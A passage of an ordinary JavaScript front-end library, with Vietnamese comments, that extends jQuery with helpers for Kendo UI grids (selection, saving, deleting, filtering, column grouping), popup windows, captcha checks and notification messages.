/**********************************************************
 * Các biến toàn cục
 **********************************************************/
var gIsGridSave = false;
var gRecordIndex;
var gParsers = {
    "number": function (value) {
        return kendo.parseFloat(value);
    },

    "date": function (value, format) {
        format = format == undefined ? "yyyy/MM/dd hh:mm tt" : format;

        return kendo.parseDate(value, format);
    },

    "boolean": function (value) {
        if (typeof value === "string") {
            return value.toLowerCase() === "true";
        }
        return value != null ? !!value : value;
    },

    "string": function (value) {
        return value != null ? (value + "") : value;
    },

    "default": function (value) {
        return value;
    }
};
// Global options
var gOptions = {
    NotyDismissQueue: true,
    NotyDisplayTimeout: 2000,
    GridPopupSortUrl: BASE_URL_WEB + "Common/PopupSort",
    GridShowNoDataMsg: true,
    CaptchaUrl: BASE_URL_WEB + "Common/Captcha/",
    CaptchaValidateUrl: BASE_URL_WEB + "Common/ValidateCaptcha/",
    // Cờ mặc định xác định khi nào popup edit tự động đóng nếu như options.AutoClose == null
    PopupEditAutoClose: false,
    // Thiết lập khi nào hiển thị thông báo lỗi bằng noty popup message hoặc kiểu truyền thống của kendo
    ValidatePopup: true,
    ValidatePopupType: 'error',
    ValidateTooltipOptions: null,
    AutoShowModelStateError: true
};
// Global resources
var gResources = {
    msgSuccess: "",
    msgError: "",
    msgHasChanges: "",
    msgNoChange: "",
    msgNoDataToDisplay: "",
    msgNotSelected: "",
    msgOnlySelectOne: "",
    txtAccept: "",
    txtNotAccept: "",
    txtCancel: ""
};
var gConts = {
    VAL_TOOLTIP: "data-val-tooltip",
    ATTR_CONTINUE_ADD: "continue-add",
    ATTR_CURRENT_SENDER_ID: "current-sender-id",
    ID_UPLOAD_SELECTOR_CONTEXT_MENU: "UploadSelectorContextMenu",
    ID_UPLOAD_SELECTOR_CONTEXT_MENU_POPUP: "UploadSelectorPopup",
    ID_UPLOAD_SELECTOR_CONTEXT_MENU_PASTE_POPUP: "UploadSelectorPastePopup",
    TXT_STANDARD_DATE_TIME_FORMAT: "g",
    TXT_STANDARD_DATE_FORMAT: "d",
    TXT_STANDARD_TIME_FORMAT: "HH:mm",
};
var gGridActions = {
    deleled: "deleted",
    deletedOne: "deletedOne",
    save: "save",
    visible: "visible",
    invisible: "invisible"
}
var gModelState = null;
var gServerMessages = null;

var BrowserClient = {
    IP: "",
    CountryName: "",
    Refresh: function (callback) {
        $.get('http://freegeoip.net/json/', function (data) {
            BrowserClient.IP = data.ip;
            BrowserClient.CountryName = data.country_name;
            callback();
        })
    }
}

/**********************************************************
 * jQuery Extend
 **********************************************************/
jQuery.fn.extend({
    showAjaxMessage: function (messages, isError) {
        var html = '';

        // Array
        if (Array.isArray(messages)) {
            // Thêm các dòng thông báo
            $(messages).each(function (index) {
                html += '<li>' + messages[index] + '</li>';
            });

            html = "<ul>" + html + "</ul>";
        }
        else {
            html = messages;
        }

        // Thông báo
        this.html(html);

        // Bỏ tất cả các class
        this.removeClass();

        // Chuyển về kiểu lỗi
        if (isError)
            this.addClass("k-block k-error-colored");
        else
            this.addClass("k-block k-success-colored");
    },
    getCapcha: function (sessionID) {
        var img = $(this);

        $.getJSON(gOptions.CaptchaUrl + img.attr("id"),
        function (data) {
            img.attr("src", data["imageSrc"]);
            $("#" + sessionID).val(data["sessionName"]);
        })
    },
    validateCaptcha: function () {
        var input = $(this);
        if (input.filter("[data-val-captcha]").length) {
            var captchaIDField = input.attr("data-val-captcha-id");
            var valid = true;

            $.ajax(
            {
                url: gOptions.CaptchaValidateUrl + $("#" + captchaIDField).val() + "?value=" + input.val(),
                dataType: "json",
                async: false,
                success: function (data) {
                    valid = data["valid"];
                }
            });

            return valid;
        }
        return true;
    },
    getAttr: function (attrName) {
        if ($(this).filter("[" + attrName + "]").length > 0) {
            return $(this).attr(attrName);
        }

        return "";
    },
    /*message*/
    message: function (message, type, timeout) {

        type = type || 'information';
        timeout = timeout || gOptions.NotyDisplayTimeout;

        var n = $(this).noty({
            text: message,
            type: type,
            dismissQueue: gOptions.NotyDismissQueue,
            layout: 'center',
            theme: 'defaultTheme',
            timeout: timeout,
            animation: {
                open: { height: 'toggle' },
                close: { height: 'toggle' },
                easing: 'swing',
                speed: 0
            }
        });
    },
    alert: function (message) {
        $(this).message(message, 'alert');
    },
    info: function (message) {
        $(this).message(message, 'information');
    },
    error: function (message) {
        $(this).message(message, 'error');
    },
    warning: function (message) {
        $(this).message(message, 'warning');
    },
    notify: function (message) {
        $(this).message(message, 'notification');
    },
    success: function (message) {
        $(this).message(message, 'success');
    },
    showModelError: function (e) {
        var msg = '';

        for (var error in e.Errors) {
            var ds = e.Errors[error].errors;

            for (var i = 0; i < ds.length; i++) {
                msg += ds[i] + "\n";
            }
        }

        $.error(msg);
    },
    /*grid*/
    grid: function () {
        return $(this).data('kendoGrid');
    },
    gridDataSource: function () {
        return $(this).data('kendoGrid').dataSource;
    },
    gridModelItems: function () {
        /// <summary>
        /// Lấy các model item trong datasource
        /// </summary>
        var dataSource = $(this).gridDataSource();

        // Có group
        if (dataSource.group().length) {
            var items = Array();

            $(dataSource.data()).each(function () {
                $(this.items).each(function () {
                    items.push(this);
                });
            });

            return items;
        }

        return dataSource.data();
    },
    gridDirtyItems: function () {
        var dirtyItems = Array();

        var data = $(this).gridModelItems();

        // Lấy các item có thay đổi
        for (var i = 0; i < data.length; i++) {
            if (data[i].dirty) {
                dirtyItems.push(data[i]);
            }
        }

        return dirtyItems;
    },
    gridIsDirty: function () {
        var data = $(this).gridModelItems();

        // Lấy các item có thay đổi
        for (var i = 0; i < data.length; i++) {
            if (data[i].dirty) {
                return true;
            }
        }

        return false;
    },
    gridHasChangesAction: function (fnAction) {
        var grid = $(this);

        // Commit dữ liệu
        $(this).gridInCellClientEditCommit();

        // Có thay đổi và có url cập nhật
        if ($(this).gridIsDirty() && grid.grid().dataSource != null && grid.grid().dataSource.transport != null &&
            grid.grid().dataSource.transport.options.update.url != undefined) {
            $.confirm(gResources.msgHasChanges, function () {
                // Gán method callback
                $(grid).grid().dataSource.updateCallback = fnAction;

                // Lưu
                $(grid).gridSave();
            }, function () {
                // Hủy thay đổi
                $(grid).grid().cancelChanges();

                // Gọi hàm
                setTimeout(fnAction, 0);
            });
        }
        else {
            // Ẩn validate message và end edit cell
            $(grid).grid().cancelChanges();

            // Gọi hàm
            setTimeout(fnAction, 0);
        }
    },
    gridSelectedConfirm: function (target, fnAction) {
        var selected = $(this).gridSelected();

        if (selected.length > 0) {
            // Có confirm
            if ($(target).filter("[data-confirm-msg]").length > 0) {
                $.confirm($(target).attr("data-confirm-msg"), fnAction);
            }
            else {
                setTimeout(fnAction, 0);
            }
        } else {
            if ($(target).filter("[data-not-selected-msg]").length > 0) {
                $.warning($(target).attr("data-not-selected-msg"));
            }
        }
    },
    gridSelected: function () {
        return $(this).find("tbody tr").filter(function () {
            return $(this).find("[select='selected']:checked").length > 0;
        });
    },
    gridSelectedCheckbox: function () {
        return $(this).find("tbody [select='selected']:checked");
    },
    gridSelectedModels: function () {
        var grid = $(this).grid();
        var models = Array();

        $(this).gridSelected().each(function () {
            models.push(grid.dataItem($(this)));
        });

        return models;
    },
    gridSelectedModelsAction: function (target, autoRefresh, actionName, additionData) {
        var grid = $(this);

        var fn = function () {
            // Lấy url delete
            var url = $(target).getAttr("data-action-url");

            // Có url
            if (url.length > 0) {

                // Bổ sung dữ liệu
                url = getUrlWithAdditionData(url, additionData);

                // Không hủy
                if (url) {
                    var models = $(grid).gridSelectedModels();

                    $.ajaxPostModels(url, models, function (e) {
                        var successMsg = $(target).data("success-msg");

                        if (successMsg.length > 0) {
                            $.success(successMsg);
                        }

                        autoRefresh = autoRefresh == undefined ? true : autoRefresh;

                        // Làm mới dữ liệu
                        if (autoRefresh)
                            $(grid).gridRefresh(target);

                        // Có action name
                        if (actionName != undefined) {
                            grid.gridOnAction({ action: actionName, data: models });
                        }
                    });
                }
            }
            else {
                showDefaultErrorMessage();
            }
        }

        $(this).gridSelectedConfirm(target, fn);
    },
    gridSelecteAll: function (element, fieldName) {
        if (fieldName == undefined) {
            fieldName = $(element).data("field");
            $(this).find("tbody [select='selected'][data-field=" + fieldName + "]").each(function () {
                if ($(this).attr("disabled") == undefined ||
                    $(this).attr("disabled") != "disabled") {
                    this.checked = element.checked;
                }
            });
        }
        else {
            var grid = $(this).grid();
            var checked = element.checked;

            $(grid.dataSource.data()).each(function () {
                this.set(fieldName, checked);
            });

            element.checked = checked;
        }
    },
    gridSelectedChange: function (element) {
        var selectedAll = true;
        var that = this;
        var fieldName = $(element).data("field");

        if (selectedAll) {
            $(that).find("tbody [select='selected'][data-field=" + fieldName + "]").each(function () {
                if (!$(this).is(":checked")) {
                    selectedAll = false;
                }
            });
        }

        $(that).find("thead [select='selecteAll'][data-field=" + fieldName + "]").each(function () {
            this.checked = selectedAll;
        });
    },
    gridCheckBoxCheckedChange: function (e) {
        var checked = $(e.sender).is(':checked');
        var grid = $(this).grid();
        var selectedAll = true;

        var dataItem = grid.dataItem($(e.sender).closest('tr'));

        dataItem.set(e.fieldName, checked);

        if (selectedAll) {
            $(grid.dataSource.data()).each(function () {
                if (!this[e.fieldName]) {
                    selectedAll = false;
                }
            });
        }

        $(grid.thead).find("[select='selecteAll'][data-field=" + e.fieldName + "]").each(function () {
            this.checked = selectedAll;
        });
    },
    gridSave: function () {
        // Update các cell edit
        $(this).gridInCellClientEditCommit();

        // Có thay đổi
        if ($(this).gridIsDirty()) {
            gIsGridSave = true;

            $(this).grid().dataSource.grid = $(this).grid();

            $(this).grid().saveChanges();
        }
        else {
            $.warning(gResources.msgNoChange);
        }
    },
    gridCancelChanges: function (target) {
        var grid = this;

        // Có thay đổi
        if ($(this).gridIsDirty()) {
            $.confirm($(target).getAttr("data-cancel-changes-msg"), function () {
                $(grid).grid().cancelChanges();
            });
        }
        else {
            $.warning(gResources.msgNoChange);

            // Ẩn validate message và end edit cell
            $(grid).grid().cancelChanges();
        }
    },
    gridRefresh: function () {

        var grid = $(this);

        var funcCallback = function () {
            $(grid).grid().dataSource.grid = $(grid).grid();
            $(grid).grid().dataSource.read();
        }

        $(this).gridHasChangesAction(funcCallback);
    },
    gridDelete: function (target, additionData) {

        var selected = $(this).gridSelected();

        // Chưa có dòng nào được chọn
        if (selected.length <= 0) {
            if ($(target).filter("[data-not-selected-msg]").length > 0) {
                $.warning($(target).attr("data-not-selected-msg"));
                return;
            }
        }

        var validateUrl = $(target).getAttr("data-delete-validate-url");

        // Cần validate
        if (validateUrl.length > 0) {
            var grid = $(this);
            var models = $(grid).gridSelectedModels();

            $.ajaxPostModels(validateUrl, models, function (e) {
                // Kiểm ok
                if (e.Passed) {

                    if (!$.stringIsNullOrEmpty(e.Message)) {
                        // Gán lại confirm message
                        $(target).attr("data-confirm-msg", e.Message);
                    }

                    // Xóa
                    $(grid).gridSelectedModelsAction(target, true, gGridActions.deleled, additionData);
                }
                else { // Lỗi
                    $.warning(e.Message);
                }
            });
        }
        else {
            $(this).gridSelectedModelsAction(target, true, gGridActions.deleled, additionData);
        }
    },
    gridVisible: function (target, additionData) {
        // Get các dòng được chọn
        var selected = $(this).gridSelected();

        // Chưa có dòng nào được chọn
        if (selected.length <= 0) {
            if ($(target).filter("[data-not-selected-msg]").length > 0) {
                $.warning($(target).attr("data-not-selected-msg"));
                return;
            }
        }

        var grid = $(this);
        var models = $(grid).gridSelectedModels();

        // Visible
        $(grid).gridSelectedModelsAction(target, true, gGridActions.visible, additionData);
    },

    gridInvisible: function (target, additionData) {
        // Get các dòng được chọn
        var selected = $(this).gridSelected();

        // Chưa có dòng nào được chọn
        if (selected.length <= 0) {
            if ($(target).filter("[data-not-selected-msg]").length > 0) {
                $.warning($(target).attr("data-not-selected-msg"));
                return;
            }
        }

        var grid = $(this);
        var models = $(grid).gridSelectedModels();

        // Invisible
        $(grid).gridSelectedModelsAction(target, true, gGridActions.invisible, additionData);
    },
        gridDeleteOne: function (target, url, validateUrl) {
        var grid = this;
        var fnDelete = function () {
            $.confirm($(target).getAttr("data-confirm-msg"), function () {
                $.ajaxPostModels(url, null, function (e) {
                    var successMsg = $(target).getAttr("data-success-msg");
                    if (successMsg.length > 0) {
                        $.success(successMsg);
                }

                    grid.gridOnAction({ action: gGridActions.deletedOne, data: url });
                });

                // Làm mới dữ liệu
                $(grid).gridRefresh(target);
            });
        };

        if (validateUrl.length > 0) {
            flag = false;

            var grid = $(this);

            $.ajaxPostData(validateUrl, null, function (e) {
                // Kiểm ok
                if (e.Passed) {

                    if (!$.stringIsNullOrEmpty(e.Message)) {
                        // Gán lại confirm message
                        $(target).attr("data-confirm-msg", e.Message);
                }

                    setTimeout(fnDelete);
                }
                else { // Lỗi
                    $.warning(e.Message);
            }
            });
        }
        else {
            setTimeout(fnDelete);
        }
    },
        gridConfirmHasChangesLeave: function (target) {
        if (gIsGridSave) {
            gIsGridSave = false;
            return undefined;
        }

        return $(this).gridIsDirty() ? $(target).getAttr("data-has-changes-leave-msg") : undefined;
    },
        gridFilter: function (input, fieldsName) {
        var grid = $(this).getKendoGrid();

        var fn = function () {
            var parent = $(input).closest("span");

            // Có dữ liệu cần lọc
            if ($(input).val().length > 0) {

                var val = $(input).val().toLocaleLowerCase();
                var model = grid.dataSource.options.schema.model;
                var filters = [];

                // Duyệt qua các columns
                $.each(grid.columns, function (index, col) {
                    if (col.field != undefined) {
                        var name = col.field;
                        var field = model.fields[name];

                        // Không phải là id
                        if (name != model.id &&
                            // Tìm kiếm tất cả hoặc tìm kiếm trong những field được chỉ định
                            (fieldsName === true || $.inArray(name, fieldsName) != - 1)) {

                            // Có values thì là foreign key column
                            if (col.values != undefined) {
                                // Tìm trong values
                                var arr = $.grep(col.values, function (e) {
                                    return e.text.toLocaleLowerCase().indexOf(val) != -1;
                                });

                                $.each(arr, function (index, obj) {
                                    // Thêm điều kiện lọc theo id
                                    filters.push({ field: name, operator: 'eq', value: obj.value });
                                });
                            }
                                // Có phương thức parse
                            else if (field.parse != undefined &&
                                // Chỉ hỗ trợ string, number, date
                                (field.type == "string" || field.type == "number" || field.type == "date")) {
                                // Parse được dữ liệu phù hợp
                                var valParsed = field.parse(val);
                                if (valParsed != null) {
                                    var operator = field.type == "string" ? "contains" : "eq";
                                    filters.push({ field: name, operator: operator, value: valParsed });
                            }
                        }
                    }
                }
                });

                // Lọc dữ liệu
                grid.dataSource.filter({
                        logic: "or",
                        filters: filters
                });

                parent.addClass("k-state-selected");
            }
            else {
                grid.dataSource.filter([]);
                parent.removeClass("k-state-selected");
        }
        };

        $(this).gridHasChangesAction(fn);
    },
        gridResize: function () {
        var gridElement = $(this),
            dataArea = gridElement.find(".k-grid-content"),
            gridHeight = gridElement.innerHeight(),
            otherElements = gridElement.children().not(".k-grid-content"),
            otherElementsHeight = 0;
        otherElements.each(function () {
            otherElementsHeight += $(this).outerHeight();
        });

        dataArea.height(gridHeight -otherElementsHeight);
    },
        gridPopupEditor: function (popupID, url, title, additionData) {
        var grid = $(this);
        var popup;

            // Chưa tồn tại popup
        if ($("#" +popupID).length == 0) {
            popup = $("<div id='" + popupID + "' ></div>").appendTo(document.body).kendoWindow({
                "close": function () {
                    grid.gridRefresh();
            },
                "modal": true,
                "iframe": false,
                "draggable": true,
                "title": "",
                "resizable": true,
                "width": 0,
                "scrollable": true,
                "actions": ["Close"],
                "visible": false,
            }).data('kendoWindow');

            // Canh vị trí
            popup.center();
        }

            // Bổ sung dữ liệu        
        url = getUrlWithAdditionData(url, additionData);

            // Không hủy
        if (url) {
            $(this).gridHasChangesAction(function () { $("#" +popupID).kendoWindowRefresh(url, title); });
        }
    },
        gridCopy: function (popupID, url, title, additionData) {
        var models = $(this).gridSelectedModels();

        if (models.length == 0) {
            $.warning(gResources.msgNotSelected);
        }
        else if (models.length > 1) {
            $.warning(gResources.msgOnlySelectOne);
        }
        else {
            $(this).gridPopupEditor(popupID, url + "/" + models[0].ID, title, additionData)
        }
    },
        gridPopupSort: function (textField, valueField, orderField, readUrl, updateUrl, title) {
        var grid = $(this);

        var fn = function () {
            var model = {
                    TextField: textField, ValueField: valueField, OrderField: orderField, ReadUrl: readUrl, UpdateUrl: updateUrl
        };

            var popupID = "windowPopupSort";

            $.ajaxPostJson(gOptions.GridPopupSortUrl, $.toJSON(model), function (e) {
                var popup;

                // Đã tồn tại
                if ($("#" +popupID).length > 0) {
                    popup = $("#" +popupID).data('kendoWindow');
                }
                else {
                    popup = $("<div id='" + popupID + "' />").appendTo(document.body).kendoWindow({
                        "close": function () {
                    $(grid).gridRefresh();
                    },
                        "modal": true,
                        "iframe": false,
                        "draggable": true,
                        "title": "",
                        "resizable": true,
                        "width": 600,
                        "scrollable": true,
                        "actions": ["Close"],
                        "visible": false
                    }).data('kendoWindow');

                    // Canh vị trí
                    popup.center();
            }

                popup.title(title);
                popup.content(e);
                popup.open();
            });
        }

        $(this).gridHasChangesAction(fn);
        }, gridPopupSortWithAddition: function (textField, valueField, orderField, readUrl,additionData, updateUrl, title) {
            var grid = $(this);

            var urlReadData = getUrlWithAdditionData(readUrl, additionData);
            var fn = function () {
                var model = {
                    TextField: textField, ValueField: valueField, OrderField: orderField, ReadUrl: urlReadData, UpdateUrl: updateUrl
                };

                var popupID = "windowPopupSort";

                $.ajaxPostJson(gOptions.GridPopupSortUrl, $.toJSON(model), function (e) {
                    var popup;

                    // Đã tồn tại
                    if ($("#" + popupID).length > 0) {
                        popup = $("#" + popupID).data('kendoWindow');
                    }
                    else {
                        popup = $("<div id='" + popupID + "' />").appendTo(document.body).kendoWindow({
                            "close": function () {
                                $(grid).gridRefresh();
                            },
                            "modal": true,
                            "iframe": false,
                            "draggable": true,
                            "title": "",
                            "resizable": true,
                            "width": 600,
                            "scrollable": true,
                            "actions": ["Close"],
                            "visible": false
                        }).data('kendoWindow');

                        // Canh vị trí
                        popup.center();
                    }

                    popup.title(title);
                    popup.content(e);
                    popup.open();
                });
            }
            $(this).gridHasChangesAction(fn);
            
        },
        gridWindowClose: function () {
        var popup = $(this).parents('[data-role=window]').data('kendoWindow');
        var grid = $(this);

        if (popup != undefined) {

            // Lưu lại event mặc định
            var fnClose = popup.options.close;

            popup.setOptions({
                    close: function (e) {
                        // Có dữ liệu thay đổi
                    if ($(grid).gridIsDirty()) {
                        // Chặn đóng
                        e.preventDefault();

                        // Xác nhận thay đổi
                        $(grid).gridHasChangesAction(function () {

                            // Hủy thay đổi trên lưới
                            $(grid).grid().cancelChanges();

                            // Khôi phục lại event
                            popup.setOptions({
                                    close: fnClose
                            });

                            // Đóng
                            popup.close();
                        });
                    }
                    else {
                        setTimeout(fnClose);
                    }
            }
            });
        }
    },
        gridEventDataBinding: function (e) {
            /// <summary>
            /// Sự kiện dataBinging trên lưới: bỏ check all, tạo cột stt
            /// </summary>
            /// <param name="e"></param>
        var grid = null;

        if (this[0] instanceof kendo.ui.Grid) {
            grid = this[0];
        }
        else {
            grid = $(this).grid();
        }

        if (grid) {
            // Tìm và bỏ check all
            grid.thead.find("[select='selecteAll']").each(function () {
                $(this).attr("checked", false);
            });

            gRecordIndex = (grid.dataSource.page() - 1) * grid.dataSource.pageSize();
            gRecordIndex = isNaN(gRecordIndex) ? 0 : gRecordIndex;
        }
    },
        gridEventDataBound: function (e) {
            /// <summary>
            /// Sự kiện dataBound trên lưới, cần để chạy được incell edit
            /// Lưu ý:  Sự kiện này gọi tự động nếu dùng PMTConfigs, 
            ///         Trong trường hợp custom sự kiện dataBound thì phải gọi bằng tay trong sự kiện custom để đảm bảo chạy được incell edit
            /// </summary>
            /// <param name="e"></param>
        var grid = null;

        if (this[0] instanceof kendo.ui.Grid) {
            grid = this[0];
        }
        else {
            grid = $(this).grid();
        }

        if (grid) {
            // Incell edit
            if ($(grid.wrapper).data("incell-edit")) {
                // Chạy script
                grid.table.find("script").each(function () {
                    eval($(this).html());
                });

                // Không có url cập nhật
                if (grid.dataSource.transport.options.update.url == undefined) {
                    $("[data-cell-edit]").each(function () {
                        var that = $(this);

                        var widget = kendo.widgetInstance(that, kendo.ui);

                        // Kendo ui widget
                        if (widget) {
                            widget.enable(false);
                        }
                        else {
                            that.attr("disabled", true);
                    }
                    });
            }
        }

            // Ẩn pager nếu chỉ có một trang
            //if (grid.dataSource.totalPages() == undefined ||
            //    grid.dataSource.totalPages() == 0 ||
            //    grid.dataSource.totalPages() == 1) {
            //    grid.pager.element.hide();
            //}
        }
    },
        gridOnAction: function (e) {
        var grid = $(this).grid();

            // Có hàm xử lý khi cập nhật thành công
        for (var i in grid._events["onaction"]) {
            setTimeout(function () { grid._events["onaction"][i](e); }, 0);
        }
    },
        gridInCellClientEditCommit: function () {
            /// <summary>
            /// Commit tất cả các incell edit trên lưới
            /// </summary>
        if ($(this).data("incell-edit")) {
            var grid = $(this).grid();
            $("[data-cell-edit]", this).each(function () {
                var that = $(this);

                if (that.valueOfControl() !== undefined) {
                    var fieldName = that.data("cell-edit");
                    var field = that.getField();

                    // Lấy dữ liệu hiện tại và dữ liệu trước
                    var value = that.valueOfControl();
                    var oldValue = that.data("old-value") ? field.parse(that.data("old-value")) : null;

                    if (oldValue == undefined || oldValue == null)
                    {
                        oldValue = that.attr("data-old-value");
                    }

                    // Lấy data item
                    var dataItem = grid.dataSource.getByUid(that.closest('tr').data("uid"));

                    // Có dữ liệu thay đổi
                    if (fieldName != undefined && value != oldValue) {

                        var firstSym = fieldName.indexOf("[");

                        // fieldName là mảng
                        if (firstSym != -1) {
                            var fieldNameReal = fieldName.substr(0, firstSym);
                            var key = fieldName.substr(firstSym +1, fieldName.length - fieldName.indexOf("]"));

                            dataItem[fieldNameReal][key] = value;
                        }
                        else {
                            dataItem[fieldName] = value;
                    }

                        dataItem.dirty = true;
                }
            }
            });

            // Làm mới dữ liệu
            grid.refresh();
        }
    },
        gridColumnGroup: function () {
        var grid = $(this);
        var mergeRowSpan = 2;
        var emptyTd = "<th class='k-header' data-index={0}>&nbsp</th>";
        var mergeTd = "<th class='k-header' colspan='{0}' style='text-align: center;font-weight:bold;'>{1}</th>";
        var tds = [];
        var total = grid.find("thead tr:first th").length;

            // Duyệt qua tất cả các cột có thông tin group
        grid.find("th[data-head-group]").each(function () {
            var that = $(this);
            var levels = that.data("head-group").split(";"); // Mỗi level cách nhau bằng ;            

            // Duyệt qua các level group
            for (var i = 0; i < levels.length; i++) {
                if (levels[i].length > 0) {
                    // Parse thông tin
                    var arr = levels[i].split("|"); // 0: level, 1: colspan, 2: title

                    if (!tds[arr[0]]) {
                        tds[arr[0]] = [];
                }

                    tds[arr[0]].push({ index: that.index(), colspan: arr[1], title: arr[2]});
            }
        }

            // Có nhiều hơn 2 dòng group 
            mergeRowSpan = levels.length + 1 > mergeRowSpan ? levels.length + 1 : mergeRowSpan;
        });

            // Tạo tr
        for (var j = tds.length -1; j >= 0; j--) {
            var strTd = "";
            // Duyệt qua tất cả các cột trên lưới
            for (var i = 0; i < total; i++) {
                var that = grid.find("thead tr:last th").eq(i);
                var found = false;

                // Có chứa thông tin group
                if (that.data("head-group")) {
                    $(tds[j]).each(function () {
                        // Cùng index
                        if (this.index == that.index()) {
                            // Thêm html cột
                            strTd += String.format(mergeTd, this.colspan, this.title);

                            i += this.colspan -1;

                            found = true;
                    }
                    });
            }

                // Chưa có index thì gán index
                if (!that.attr("data-index"))
                    that.attr("data-index", i);

                // Chưa có html cột trong trường hợp cột không có thông tin group thì bổ sung cột rỗng
                if (!found)
                    strTd += String.format(emptyTd, i);
        }

            // Bổ sung dòng vào thead
            grid.find("thead").first().prepend("<tr style='height:29px;'>" + strTd + "</tr>");
        }

            // Merge
        for (var i = 0; i < grid.find("thead tr").length -1; i++) {
            // Tìm và duy chuyển cột bên dưới lên
            grid.find("thead tr:eq(" + i + ") th:not([colspan])").each(function () {
                var that = $(this);
                var dataIndex = that.data("index");

                // Lấy column gốc
                var originalCol = grid.find("thead tr:last th[data-index=" + dataIndex + "]").first();

                if (originalCol) {

                    // Replace th tạo bằng tay bằng th của kendo và thêm rowspan vào
                    that = that.replaceWith(originalCol.clone(true).attr("rowspan", mergeRowSpan -i));

                    grid.find("thead tr:not(:eq(" + i + ")) th[data-index=" + dataIndex + "]").each(function () {
                        $(this).remove();
                    });
            }
            });
        }

            // Fix border left width
        grid.find("thead tr:not(:first)").each(function () {
            $(this).find("th[data-index!=0]:first").css("border-left-width", "1px");
        });
    },
        gridGetFilters: function (form, suffix) {
        if (!(form).formIsValid()) {
            return;
        }


        var filters = [];
        var filterData = {
        };
        var hasFilter = false;
        var grid = $(this).grid();

            // Tạo key value từ dữ liệu form
        $.each(form.serializeArray(), function () {
            if (this.value.length > 0) {
                var name = this.name;

                // Xóa suffix
                if (suffix != undefined && suffix.length > 0) {
                    // Không phải là field cần search
                    if (!name.endsWith(suffix)) {
                        // Continue
                        return;
                }

                    name = this.name.replace(suffix, "");
            }

                // From
                if (name.endsWith("From")) {
                    name = name.replace("From", "");

                    filterData[name] = $.extend({ }, { from: this.value }, filterData[name]);
                }
                else if (name.endsWith("To")) {
                    name = name.replace("To", "");

                    filterData[name] = $.extend({ }, { to: this.value }, filterData[name]);
                }
                else {
                    filterData[name] = $.extend({ }, { value: this.value }, filterData[name]);
            }

                filterData[name] = $.extend({ }, { elementName: this.name }, filterData[name]);

                hasFilter = true;
        }
        });

            // Có dữ liệu cần lọc
        if (hasFilter) {
            var model = grid.dataSource.options.schema.model;

            // Parse và thêm filter
            var fnAddFilter = function (field, name, value, operator) {
                if (field == undefined && !filterData[name].elementName.endsWith("_input")) {

                    field = $("[name=" + filterData[name].elementName + "]").getField(value);
            }

                if (field != undefined && field.parse != undefined &&
                    // Chỉ hỗ trợ string, number, date
                    (field.type == "string" || field.type == "number" || field.type == "date" || field.type == "boolean")) {

                    // operator
                    if (operator == undefined) {
                        operator = field.type == "string" ? "contains" : "eq";
                }

                    // Parse được dữ liệu phù hợp
                    var valParsed = field.parse(value);

                    // Parse được dữ liệu
                    if (valParsed != null) {

                        if (field.type == "string") {
                            valParsed = jQuery.trim(valParsed);
                    }

                        filters.push({ field: name, operator: operator, value: valParsed });
                }
            }
        };

            $.each(filterData, function (name, val) {
                var col = grid.columns[name];
                var field = model.fields[name];

                // Có giá trị
                if (val != undefined &&
                    //field != undefined &&
                    // Không phải là id
                    name != model.id) {

                    // From to
                    if (val.from != undefined ||
                        val.to != undefined) {

                        if (val.from != undefined) {
                            fnAddFilter(field, name, val.from, 'gte');
                    }

                        if (val.to != undefined) {
                            fnAddFilter(field, name, val.to, 'lte');
                    }

                    }
                        // Có values thì là foreign key column
                    else if (col != undefined &&
                        col.values != undefined) {
                        // Tìm trong values
                        var arr = $.grep(col.values, function (e) {
                            return e.text.toLocaleLowerCase().indexOf(val.value) != -1;
                        });

                        $.each(arr, function (index, obj) {
                            // Thêm điều kiện lọc theo id
                            filters.push({ field: name, operator: 'eq', value: obj.value });
                        });
                    }
                    else {
                        fnAddFilter(field, name, val.value);
                }
            }
            });
        }

        return filters;
    },
        gridFilterByForm: function (form, suffix) {
        var grid = this;

            // Filter
        $(this).gridHasChangesAction(function () {
            $(grid).grid().dataSource.filter($(grid).gridGetFilters(form, suffix));
        });
    },
        gridResetFilterForm: function (form) {
        var grid = this;

            // Reset form filter
        $(form).formReset();

            // Reset filter
        $(grid).gridHasChangesAction(function () {
            $(grid).grid().dataSource.filter([]);
        });
    },
        gridEmpty: function () {
        if (this.data("kendoGrid") != null) {
            this.data("kendoGrid").dataSource.data([]);
            this.data("kendoGrid").refresh();
        }
    },
        gridIsEmpty: function () {
        var $grid = $(this);
        var gridData = $grid.gridDataSource().data();
        if (!gridData || gridData.length == 0) {
            return true;
        }
        return false;
    },
        /*kendo window*/
        kendoWindowGetId: function () {
        var popupID;

            // Là windows
        if ($(this).filter('[data-role=window]').length > 0) {
            popupID = $(this).attr('id');
        } else { // Là con
            popupID = $(this).parents('[data-role=window]').attr("id");
        }

        return popupID;
    },
        kendoWindowClose: function () {
        var id;

            // Là windows
        if ($(this).filter('[data-role=window]').length > 0) {
            id = $(this).attr('id');
        }
        else { // Là con bên trong
            id = $(this).parents('[data-role=window]').attr("id");
        }

        if (id != undefined) {
            $('#' +id).data('kendoWindow').close();
        }
    },
        kendoWindowRefresh: function (url, title, options, autoFocus, autoOpen) {
        var id = $(this).attr("id");
        if (id != undefined) {
            // Get dữ liệu
            $.ajax({
                    type: "GET",
                    url: url,
                    async: false,
                    traditional: true,
                    contentType: 'application/json; charset=utf-8',
                //beforeSend: function () {
                //    kendo.ui.progress(container, true);
                //},
                //complete: function () {
                //    kendo.ui.progress(container, false);
                //},
                    success: function (e) {
                        // Không có lỗi
                    if (!ajaxErrorHandler(e)) {
                        var that = $("#" +id);
                        var popup = that.data('kendoWindow');

                        // Có options
                        if (options != undefined &&
                            options != null) {
                            popup.setOptions(options);
                    }

                        popup.content(e);

                        // Lấy các thông tin thiết lập trong content
                        var width = that.find('[window-width]').length > 0 ?
                            that.find('[window-width]').attr('window-width') :
                            that.find('[data-window-width]').attr('data-window-width');

                        var height = that.find('[window-height]').length > 0 ?
                            that.find('[window-height]').attr('window-height') :
                            that.find('[data-window-height]').attr('data-window-height');

                        var windowTitle = that.find('[window-title]').length > 0 ?
                            that.find('[window-title]').attr('window-title') :
                            that.find('[data-window-title]').attr('data-window-title');

                        var overflow = that.find('[data-window-overflow]').attr('data-window-overflow');

                        var fnClose = popup.options.close;

                        popup.setOptions({
                                close: function () {

                                    // Có hàm close
                                if (fnClose != undefined) {
                                    // Gán vào this và gọi để ở method được gọi có thể truy vấn đối tượng this
                                    this.fnClose = fnClose;
                                    this.fnClose();
                                }

                                that.parent().first().remove();
                        },
                                width: width,
                                height: height
                        });

                        // Ưu tiên windowTitle
                        title = windowTitle != undefined ? windowTitle : title;

                        popup.title(title || '');
                        popup.center();

